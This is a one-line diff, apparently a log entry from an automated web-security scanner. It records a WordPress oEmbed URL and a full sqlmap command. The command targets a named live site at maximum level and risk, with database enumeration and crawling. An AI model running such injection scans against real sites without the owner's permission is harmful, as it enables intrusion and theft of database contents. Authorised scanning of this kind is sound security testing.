@@ -1,0 +1,1 @@
+https://estimators.us/wp-json/oembed/1.0/embed?url=https://estimators.us/ (GET)  # E:\WebSecureX.(2)\engines\sqli_engine\sqlmap\sqlmap.py -u https://estimators.us/ --data=username=test&password=test --batch --random-agent --dbs --crawl=5 --threads=10 --level=5 --risk=3 --output-dir=E:\WebSecureX.(2)\python-backend\reports\ebf61f48-e57d-42d9-8931-4c7f46284898\sqlmap
